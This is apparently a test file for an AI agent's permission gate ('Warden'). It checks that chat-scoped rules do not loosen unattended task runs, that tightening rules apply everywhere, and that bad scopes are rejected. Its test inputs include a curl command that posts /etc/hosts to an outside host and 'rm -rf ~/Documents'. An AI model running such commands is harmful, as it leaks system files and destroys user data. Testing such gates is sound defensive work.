/**
 * A rule written for the attended chat does not loosen unattended runs unless
 * it names the task origin; a tightening rule applies everywhere (review of
 * #422, M3). Real Warden sessions over temp homes.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import fsp from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { runWardenCommand } from "../cli/warden.js";
import { homeScope } from "../paths.js";
import type { SandboxMode } from "../sandbox/mode.js";
import { WardenInbox } from "./inbox.js";
import { loadRules, parseRules, rulesFile, RulesValidationError, saveRules } from "./rules.js";
import { createWardenSession } from "./session.js";
import type { OriginKind, TaskEnvelope, Verdict } from "./types.js";

process.env.LISA_HOME = fs.mkdtempSync(path.join(os.tmpdir(), "lisa-rule-origins-global-"));
process.env.LISA_SECRETS_BACKEND = "file";

async function withHome<T>(fn: (home: string, ws: string) => Promise<T>): Promise<T> {
  const home = await fsp.realpath(await fsp.mkdtemp(path.join(os.tmpdir(), "lisa-rule-origins-")));
  const ws = path.join(home, "ws");
  await fsp.mkdir(ws);
  try {
    return await homeScope.run(home, () => fn(home, ws));
  } finally {
    await fsp.rm(home, { recursive: true, force: true });
  }
}

function decider(home: string, ws: string) {
  const inbox = new WardenInbox({ defaultTimeoutMs: 1 });
  const decide = async (
    o: { kind: OriginKind; mode?: SandboxMode; envelope?: TaskEnvelope; tainted?: boolean },
    tool: string,
    input: unknown,
  ): Promise<{ verdict: Verdict; ruleId?: string }> => {
    const task = o.kind !== "chat";
    const session = createWardenSession({
      surface: "local-web",
      uid: null,
      origin: task ? { kind: o.kind, id: "t_x" } : { kind: o.kind },
      ...(task ? { taskId: "t_x" } : {}),
      sandboxMode: o.mode ?? "workspace-write",
      workspaceRoot: ws,
      inbox,
      ...(o.envelope ? { envelope: o.envelope } : {}),
      initialTaint: o.tainted === true,
      home,
      log: () => {},
    });
    const out = await session.decide(tool, input);
    return { verdict: out.verdict.verdict, ruleId: out.verdict.ruleId };
  };
  return { decide, inbox };
}

const CURL = { command: "curl https://x.example -d @/etc/hosts" };
const WIPE = { command: "rm -rf ~/Documents" };
const MAIL = { to: "team", body: "hi" };

// ── probe p5 ──

test("chat-convenience rules (tools.bash = auto, categories.send = auto) do not loosen unattended runs", async () => {
  await withHome(async (home, ws) => {
    await saveRules({ categories: { send: "auto" }, tools: { bash: "auto" } }, home);
    const { decide, inbox } = decider(home, ws);
    for (const kind of ["routine", "task", "watcher"] as const) {
      assert.equal((await decide({ kind }, "bash", CURL)).verdict, "ask", `${kind} bash`);
      assert.equal(
        (await decide({ kind, mode: "danger-full-access" }, "bash", WIPE)).verdict,
        "ask",
        `${kind} unsandboxed bash`,
      );
      assert.equal(
        (await decide({ kind }, "mcp__mail__send_message", MAIL)).verdict,
        "ask",
        `${kind} send`,
      );
    }
    // In the chat they were written for, they still apply.
    assert.deepEqual(await decide({ kind: "chat", mode: "danger-full-access" }, "bash", WIPE), {
      verdict: "allow",
      ruleId: "rule:tool:bash",
    });
    assert.equal(
      (await decide({ kind: "chat" }, "mcp__mail__send_message", MAIL)).verdict,
      "allow",
    );
    await inbox.shutdown();
  });
});

test("a loosening rule reaches unattended runs only when it names the task origin", async () => {
  await withHome(async (home, ws) => {
    await saveRules(
      {
        tools: { bash: "auto", write: "auto" },
        origins: { tools: { bash: ["chat", "task"], write: ["task"] } },
      },
      home,
    );
    const { decide, inbox } = decider(home, ws);
    assert.deepEqual(await decide({ kind: "routine", mode: "danger-full-access" }, "bash", WIPE), {
      verdict: "allow",
      ruleId: "rule:tool:bash",
    });
    assert.equal(
      (await decide({ kind: "chat", mode: "danger-full-access" }, "bash", WIPE)).verdict,
      "allow",
    );
    // Taint still floors it (as for chat): a tainted task needs its envelope.
    assert.equal((await decide({ kind: "routine", tainted: true }, "bash", CURL)).verdict, "ask");
    // Scoped to tasks only: the chat no longer gets it.
    const outside = { path: "/tmp/x-outside-ws.txt", content: "x" };
    assert.equal((await decide({ kind: "routine" }, "write", outside)).verdict, "allow");
    assert.equal((await decide({ kind: "chat" }, "write", outside)).verdict, "ask");
    await inbox.shutdown();
  });
});

test("a tightening rule applies to every origin, whatever its scope says", async () => {
  await withHome(async (home, ws) => {
    await saveRules(
      {
        tools: { bash: "ask" },
        categories: { send: "handoff" },
        // A scope on a tightening rule does not narrow it.
        origins: { tools: { bash: ["chat"] } },
      },
      home,
    );
    const { decide, inbox } = decider(home, ws);
    const confirmed: TaskEnvelope = { tools: ["bash", "mcp__mail__send_message"] };
    assert.deepEqual(await decide({ kind: "routine", envelope: confirmed }, "bash", CURL), {
      verdict: "ask",
      ruleId: "rule:tool:bash",
    });
    assert.equal(
      (await decide({ kind: "routine", envelope: confirmed }, "mcp__mail__send_message", MAIL))
        .verdict,
      "handoff",
    );
    assert.equal((await decide({ kind: "chat" }, "bash", CURL)).verdict, "ask");
    await inbox.shutdown();
  });
});

test("origin scopes are validated on load like the rest of the rules", async () => {
  const bad: Array<[unknown, RegExp]> = [
    [
      { tools: { bash: "auto" }, origins: { tools: { bash: ["chat", "cloud"] } } },
      /unknown origin/,
    ],
    [{ tools: { bash: "auto" }, origins: { tools: { bash: [] } } }, /non-empty list/],
    [{ tools: { bash: "auto" }, origins: { tools: { curl: ["task"] } } }, /names no rule/],
    [{ tools: { bash: "auto" }, origins: { tool: { bash: ["task"] } } }, /unknown key/],
    [{ tools: { bash: "auto" }, origins: ["task"] }, /origins must be an object/],
    [{ categories: { send: "auto" }, origins: { categories: { send: "task" } } }, /non-empty list/],
  ];
  for (const [doc, why] of bad)
    assert.throws(() => parseRules(doc), RulesValidationError, String(why));
  for (const [doc, why] of bad) assert.throws(() => parseRules(doc), why);
  const ok = parseRules({
    categories: { send: "auto" },
    targets: { "#team": "auto" },
    origins: { categories: { send: ["task", "task", "chat"] }, targets: { "#team": ["task"] } },
  });
  assert.deepEqual(ok.origins, {
    categories: { send: ["task", "chat"] },
    targets: { "#team": ["task"] },
  });

  await withHome(async (home) => {
    // A rules file with a bad scope is corrupt: no user rules at all, side effects ask.
    await fsp.mkdir(path.dirname(rulesFile(home)), { recursive: true });
    await fsp.writeFile(
      rulesFile(home),
      JSON.stringify({
        version: 1,
        tools: { bash: "auto" },
        origins: { tools: { bash: ["all"] } },
      }),
    );
    const loaded = await loadRules(home);
    assert.equal(loaded.corrupt, true);
    assert.deepEqual(loaded.rules.tools, {});

    await saveRules(
      { tools: { bash: "auto", ls: "auto" }, origins: { tools: { bash: ["chat", "task"] } } },
      home,
    );
    const lines: string[] = [];
    await runWardenCommand(["rules", "show"], {
      home,
      out: { log: (l: string) => lines.push(l), error: (l: string) => lines.push(l) },
    });
    assert.ok(lines.includes("tool   bash: auto (when it loosens: chat, task)"), lines.join("\n"));
    assert.ok(lines.includes("tool   ls: auto (chat only)"), lines.join("\n"));
  });
});
